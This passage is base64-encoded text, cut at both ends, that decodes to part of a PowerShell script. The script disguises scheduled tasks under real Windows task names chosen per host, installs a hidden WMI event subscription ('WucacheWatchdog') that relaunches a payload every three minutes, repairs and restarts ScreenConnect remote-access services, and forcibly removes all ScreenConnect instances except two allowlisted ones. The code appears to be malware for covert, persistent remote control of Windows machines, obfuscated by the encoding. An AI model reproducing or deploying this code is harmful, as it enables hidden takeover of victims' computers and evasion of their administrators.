XEdhdGhlck5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVs
ZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QyJywnXE1pY3Jv
c29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25vc3RpY3MnLCdcTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNSVGFzaycpCiAgICBDID0gQCgnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNv
bHV0aW9uSG9zdCcsJ1xNaWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJOZXR3b3JrSW5m
bycsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEnLCdcTWljcm9z
b2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBM
QVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcsJ1xNaWNy
b3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5kb3dz
XERpYWdub3Npc1xTUlRhc2snKQogICAgRCA9IEAoJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJ
cEFkZHJlc3NDb25mbGljdDEnLCdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25Ib3N0
JywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5ldHdvcmtJbmZvJywnXE1pY3Jv
c29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25zdW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xQ
TEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWlj
cm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciBEaWFnbm9zdGljcycsJ1xNaWNyb3NvZnRcV2luZG93
c1xEaWFnbm9zaXNcU1JUYXNrJykKfQokRGVmYXVsdHMgPSBbb3JkZXJlZF1AewogICAgVEFTS19B
ID0gJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1bGVkJwogICAgVEFTS19CID0g
J1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyJwogICAgVEFTS19DID0gJ1xNaWNyb3NvZnRc
V2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnCiAgICBUQVNLX0QgPSAnXE1pY3Jvc29mdFxXaW5k
b3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScKICAgIE1PX0EgICA9ICcyJwogICAgTU9fQiAg
ID0gJzMnCn0KCmZ1bmN0aW9uIEdldC1Ib3N0U2VlZCB7CiAgICAkcyA9IDBMCiAgICBmb3JlYWNo
ICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9
ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAwMDA3IH0KICAgIHJldHVybiAkcwp9CgpmdW5j
dGlvbiBSZWFkLUlkZW50aXR5IHsKICAgICRpZCA9ICREZWZhdWx0cy5DbG9uZSgpCiAgICBpZiAo
VGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gKEdldC1Db250
ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UpKSB7CiAgICAgICAgICAgIGlmICgkbGlu
ZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNb
MV1dID0gJG1hdGNoZXNbMl0gfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkaWQKfQoKZnVu
Y3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0bikgewogICAgaWYgKCR0bikgeyAmIHNj
aHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0KfQoKZnVuY3Rp
b24gSW5pdGlhbGl6ZS1JZGVudGl0eSB7CiAgICAjIElkZW1wb3RlbnQgd2l0aGluIGFuIElERU5U
VkVSIGdlbmVyYXRpb24uIFBvb2wgdXBncmFkZXMgYnVtcCBJREVOVFZFUjoKICAgICMgb2xkLW5h
bWUgdGFza3MgYXJlIGRlbGV0ZWQsIHRoZW4gaWRlbnRpdHkgaXMgcmVnZW5lcmF0ZWQgZnJvbSB0
aGUgc2FtZSBzZWVkLgogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgewogICAgICAgICRvbGQg
PSBSZWFkLUlkZW50aXR5CiAgICAgICAgIyBMNzogYWxzbyByZWdlbmVyYXRlIGlmIGFueSBUQVNL
XyogaXMgZW1wdHkgKEw0LUw2IG1vZHVsby9jYXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykKICAg
ICAgICAkc2xvdHNPayA9ICgkb2xkWydJREVOVFZFUiddIC1lcSAiJElkZW50VmVyc2lvbiIpIC1h
bmQgJG9sZFsnVEFTS19BJ10gLWFuZCAkb2xkWydUQVNLX0InXSAtYW5kICRvbGRbJ1RBU0tfQydd
IC1hbmQgJG9sZFsnVEFTS19EJ10KICAgICAgICBpZiAoJHNsb3RzT2spIHsgcmV0dXJuICRvbGQg
fQogICAgICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNL
X0QnKSB7IFJlbW92ZS1UYXNrUXVpZXQgJG9sZFska10gfQogICAgICAgIFJlbW92ZS1JdGVtIC1M
aXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAg
ICAjIEw0OiB0d28gc2xvdHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBz
aGFyZSBuYW1lcykgLT4KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3
YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUg
b2xkIEAoQCgnQScsICRzICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1
LjE6CiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3Qg
YWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5k
IHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tf
KiBhbmQgdGhlIHdob2xlIGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNr
IG5hbWVzLgogICAgJHNlZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAg
ICAgICBCID0gKCgkcyArIDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAg
ICBEID0gKCgkcyArIDcpICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBm
b3JlYWNoICgkbGV0dGVyIGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0k
c2VlZHNbJGxldHRlcl0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAg
ICAkbiA9IDAKICAgICAgICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5k
ICRuIC1sdCA4KSB7ICRpID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVsk
aV07ICRuKysgfQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJU
QVNLXyRsZXR0ZXIiXSB9CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAg
JGNmZyA9IEAoCiAgICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgk
cGljay5CKSIKICAgICAgICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRw
aWNrLkQpIgogICAgICAgICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWlu
IGppdHRlcgogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWlu
IGppdHRlcgogICAgICAgICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9u
IgogICAgKQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2Zn
IC1Gb3JjZQogICAgcmV0dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBJbnN0YWxsLVdh
dGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQogICAgJG9r
ID0gJHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9v
dFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGAKICAgICAg
ICAgICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVydmFs
TWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8IE91dC1OdWxs
CiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9
ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5
TGFuZ3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJTRUxF
Q1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiB9
CiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
biAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGAKICAgICAgICAgICAgLUFyZ3VtZW50
cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0gImNt
ZC5leGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9CiAgICAg
ICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9f
RmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRl
ciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbAogICAgfSBjYXRjaCB7ICRvayA9ICRm
YWxzZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9uIEVuc3VyZS1XYXRjaGRvZyB7CiAgICAk
YyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29t
bWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIgog
ICAgaWYgKCRudWxsIC1lcSAkYykgewogICAgICAgIEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVs
bAogICAgICAgIHJldHVybiAnUkVBUk1FRCcKICAgIH0KICAgIHJldHVybiAnT0snCn0KCiMgQ29y
cmVjdCAzMi1iaXQgKyA2NC1iaXQgQVJQIGhpdmVzLiBMNiBhbmQgZWFybGllciB1c2VkIGEgdHJ1
bmNhdGVkCiMgV09XNjQzMk5vZGUgcGF0aCAobWlzc2luZyBNaWNyb3NvZnRcV2luZG93cykgc28g
RVZFUlkgMzItYml0IFNDIHByb2R1Y3QKIyB3YXMgaW52aXNpYmxlIHRvIHJlcGFpci9leHRlcm1p
bmF0ZS9yZWdpc3RlcmVkLgokc2NyaXB0OlVuaW5zdGFsbFJvb3RzID0gQCgKICAgICdIS0xNOlxT
T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLAogICAg
J0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
aW9uXFVuaW5zdGFsbCcKKQoKZnVuY3Rpb24gVGVzdC1TQ1JlZ2lzdGVyZWQoW3N0cmluZ10kRmlu
Z2VycHJpbnQpIHsKICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9CiAg
ICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgIGZvcmVh
Y2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBHZXQtQ2hpbGRJ
dGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ewogICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFu
ZCAkZG4gLWxpa2UgIiokbmFtZSoiIC1hbmQgJF8uUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpIHsg
cmV0dXJuICd5ZXMnIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJ25vJwp9CgpmdW5jdGlv
biBSZXBhaXItU0NTZXJ2aWNlKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAjIFJlY3JlYXRl
cyBhIGRlbGV0ZWQgU0Mgc2VydmljZSBlbnRyeSBieSByZXBhaXJpbmcgdGhlIFJFR0lTVEVSRUQg
cHJvZHVjdC4KICAgICMgbXNpZXhlYyAvZmEge0dVSUR9IHJlcGFpcnMgaW4gcGxhY2UgLSBpdCBk
b2VzIE5PVCBydW4gdGhlIFNDLWZhbWlseQogICAgIyBtYWpvci11cGdyYWRlIHJlbW92YWwsIHNv
IG90aGVyIGluc3RhbmNlcyBhcmUgdW50b3VjaGVkLgogICAgIyBMNTogYWxzbyBoYW5kbGVzIHBy
ZXNlbnQtYnV0LVNUT1BQRUQgc2VydmljZXMgKHJlcGFpciByZXN0b3JlcyBiaW5hcmllcywKICAg
ICMgdGhlbiBzdGFydCkuIE9ubHkgYSBSdW5uaW5nIHNlcnZpY2UgaXMgY29uc2lkZXJlZCBoZWFs
dGh5LgogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAnIH0KICAgICRu
YW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgJHN2YyA9IEdl
dC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBp
ZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICdzdmMtcnVu
bmluZycgfQogICAgJGd1aWQgPSAkbnVsbAogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpV
bmluc3RhbGxSb290cykgewogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRkbiA9IChH
ZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSku
RGlzcGxheU5hbWUKICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbGlrZSAiKiRuYW1lKiIg
LWFuZCAkXy5QU0NoaWxkTmFtZSAtbGlrZSAneyp9JykgeyAkZ3VpZCA9ICRfLlBTQ2hpbGROYW1l
IH0KICAgICAgICB9CiAgICB9CiAgICBpZiAoLW5vdCAkZ3VpZCkgeyByZXR1cm4gJ25vdC1yZWdp
c3RlcmVkJyB9CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1p
Y3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwgT3V0LU51
bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
bmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mIDI+JjEg
fCBPdXQtTnVsbAogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAibXNpX3JlcGFpcl8kRmlu
Z2VycHJpbnQubG9nIgogICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVu
dExpc3QgIi9mYSAkZ3VpZCAvcW4gL25vcmVzdGFydCAvTCp2IGAiJGxvZ2AiIiAtV2FpdCAtUGFz
c1RocnUKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDgKICAgICYgc2MuZXhlIGNvbmZpZyAiJG5h
bWUiIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbAogICAgJiBzYy5leGUgc3RhcnQgIiRuYW1l
IiAyPiYxIHwgT3V0LU51bGwKICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDQKICAgICRzdmMgPSBH
ZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
aWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAic3ZjLXJl
c3RvcmVkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiIH0KICAgIGlmICgkc3ZjKSB7IHJldHVybiAic3Zj
LXN0aWxsLXN0b3BwZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQogICAgcmV0dXJuICJzdmMtc3Rp
bGwtbWlzc2luZyBleGl0PSQoJHAuRXhpdENvZGUpIgp9CgpmdW5jdGlvbiBJbnZva2UtRXh0ZXJt
aW5hdGUgewogICAgIyBMNzogdHJ1ZSByZW1vdmFsLiBDb3JyZWN0IFdPVzY0MzJOb2RlIGhpdmUg
KyBtc2lleGVjICsgVW5pbnN0YWxsU3RyaW5nCiAgICAjIGZhbGxiYWNrICsgZm9yY2UgZGlyIG51
a2UuIEtlZXAgb25seSB0aGUgdHdvIGFsbG93bGlzdGVkIGZpbmdlcnByaW50cy4KICAgICRsb2cg
PSBKb2luLVBhdGggJFdvcmtEaXIgJ2V4dGVybWluYXRlLmxvZycKICAgICRrZWVwID0gQCgnNWY2
MDEwNTc5ODUyZTUwNycsJ2Y4NjFjODE0MGQ0NTM0MjcnKQogICAgJG4gPSBAeyBzdmMgPSAwOyBw
cm9jID0gMDsgZGlyID0gMDsgcHJvZHVjdCA9IDA7IHJtbSA9IDA7IGZhaWwgPSAwIH0KICAgIGZ1
bmN0aW9uIExvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9IHsxfScgLWYgKEdl
dC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAgICAgICBBZGQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgICAgICBXcml0ZS1PdXRwdXQgJGxpbmUKICAgIH0KICAgIGZ1bmN0aW9uIElz
LUtlZXBlcihbc3RyaW5nXSRzKSB7CiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxz
ZSB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXApIHsgaWYgKCRzIC1saWtlICIqJGsqIikg
eyByZXR1cm4gJHRydWUgfSB9CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQogICAgZnVuY3Rp
b24gRm9yY2UtUmVtb3ZlRGlyKFtzdHJpbmddJGQpIHsKICAgICAgICBpZiAoLW5vdCAkZCAtb3Ig
LW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgcmV0dXJuICR0cnVlIH0KICAgICAg
ICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQg
JF8uRXhlY3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCwgW1N0cmluZ0NvbXBhcmlzb25dOjpPcmRp
bmFsSWdub3JlQ2FzZSkgfSB8CiAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9j
ZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
IH0KICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnKlMtMS01LTMyLTU0NDpGJyAvVCAvQyAvUSAy
PiYxIHwgT3V0LU51bGwKICAgICAgICAmIGljYWNscy5leGUgJGQgL2dyYW50ICdBZG1pbmlzdHJh
dG9yczpGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwKICAgICAgICBSZW1vdmUtSXRlbSAtTGl0
ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgY21k
LmV4ZSAvYyAiYXR0cmliIC1oIC1zIC1yIC9zIC9kIGAiJGRcKi4qYCIiIDI+JjEgfCBPdXQtTnVs
bAogICAgICAgICAgICBjbWQuZXhlIC9jICJybWRpciAvcyAvcSBgIiRkYCIiIDI+JjEgfCBPdXQt
TnVsbAogICAgICAgIH0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewog
ICAgICAgICAgICAkZW1wdHkgPSBKb2luLVBhdGggJGVudjpURU1QICgib3duX2VtcHR5XyIgKyBb
Z3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQogICAgICAgICAgICBOZXctSXRlbSAtSXRl
bVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlbXB0eSAtRm9yY2UgfCBPdXQtTnVsbAogICAgICAgICAg
ICAmIHJvYm9jb3B5LmV4ZSAkZW1wdHkgJGQgL01JUiAvUjowIC9XOjAgMj4mMSB8IE91dC1OdWxs
CiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZW1wdHkgLUZvcmNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFs
UGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICAgICB9CiAgICAgICAgcmV0dXJuIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpCiAg
ICB9CiAgICBmdW5jdGlvbiBVbmluc3RhbGwtUHJvZHVjdEtleSgka2V5KSB7CiAgICAgICAgJGd1
aWQgPSAka2V5LlBTQ2hpbGROYW1lCiAgICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRr
ZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgJGRuID0gJHBy
b3AuRGlzcGxheU5hbWUKICAgICAgICBpZiAoJGd1aWQgLWxpa2UgJ3sqfScpIHsKICAgICAgICAg
ICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICRndWlk
IC9xbiAvbm9yZXN0YXJ0IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyIgLVdhaXQgLVBhc3NUaHJ1IC1X
aW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgTG9nICJwcm9kdWN0X21zaWV4ZWMgWyRkbl0g
Z3VpZD0kZ3VpZCBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICBpZiAoJHAuRXhpdENv
ZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICB9CiAg
ICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxsU3RyaW5nCiAgICAgICAgaWYgKCR1cykgewogICAg
ICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCR1cyAtbWF0Y2ggJyg/aSltc2lleGVj
JykgewogICAgICAgICAgICAgICAgICAgICRhcmdzID0gKCR1cyAtcmVwbGFjZSAnKD9pKV4uKm1z
aWV4ZWMoXC5leGUpP1xzKicsICcnKQogICAgICAgICAgICAgICAgICAgIGlmICgkYXJncyAtbm90
bWF0Y2ggJy9xbicpIHsgJGFyZ3MgPSAiJGFyZ3MgL3FuIC9ub3Jlc3RhcnQiIH0KICAgICAgICAg
ICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAk
YXJncyAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICAgICAg
ICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfbXNpIFskZG5dIGV4aXQ9JCgkcC5FeGl0
Q29kZSkiCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwID0g
U3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9x
dWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAg
ICAgICAgICAgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRw
LkV4aXRDb2RlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiAkdHJ1
ZQogICAgICAgICAgICB9IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlM
IFskZG5dICRfIiB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICBM
b2cgJ2V4dGVybWluYXRlX2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0MgcHJv
ZHVjdHMgZnJvbSBCT1RIIGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAgZm9y
ZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90
IChUZXN0LVBhdGggJHJvb3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGludWUg
fQogICAgICAgIExvZyAiaGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJv
b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAg
ICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUKICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAg
ICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5vdG1h
